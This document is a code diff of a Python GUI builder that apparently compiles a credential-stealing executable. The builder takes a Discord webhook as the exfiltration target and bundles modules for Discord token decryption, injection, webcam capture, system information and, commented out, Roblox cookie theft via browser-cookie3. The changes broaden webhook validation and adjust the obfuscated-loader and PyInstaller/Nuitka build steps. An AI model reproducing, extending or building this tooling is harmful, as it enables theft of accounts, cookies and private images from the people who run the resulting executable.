@@ -107,7 +107,7 @@ class App(ctk.CTk):
         # Frame 1
 
         self.webhook_button = ctk.CTkEntry(self.builder_frame, width=570, height=35, font=ctk.CTkFont(
-            size=15, family=self.font), placeholder_text="https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz")
+            size=15, family=self.font), placeholder_text="https://discord(app).com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz")
         self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)
 
         self.checkwebhook_button = ctk.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
@@ -316,7 +316,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 
     def verify_webhook(self):
         webhook = self.webhook_button.get()
-        webhook_pattern = r'https:\/\/discord\.com\/api\/webhooks\/\d+\/\S+'
+        webhook_pattern = r'https:\/\/discord(app)?\.com\/api\/webhooks\/\d+\/\S+'
         try:
             if re.match(webhook_pattern, webhook):
                 r = requests.get(webhook, timeout=5)
@@ -656,7 +656,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt"],
                 "injection": ["psutil"],
                 "webcam": ["cv2"],
-                "systeminfo": ["psutil", "pycountry"]
+                "systeminfo": ["psutil", "pycountry"]#,
+                #"roblox": ["browser-cookie3"]
             }
             
             included_modules_pyinstaller = [
@@ -774,8 +775,10 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                         if exeicon != "NONE":
                             command.insert(-1, f"--windows-icon-from-ico={exeicon}")
                          
+                        if os.path.isfile(f"{orig_filename}.py"):
+                            os.remove(f"{orig_filename}.py")
                         os.rename("loader-o.py", f"{orig_filename}.py")
-                        self.ob
+
                         subprocess.run(command)
                         os.remove(f"{orig_filename}.py")
                         if os.path.isfile(f"{filename}.exe"):
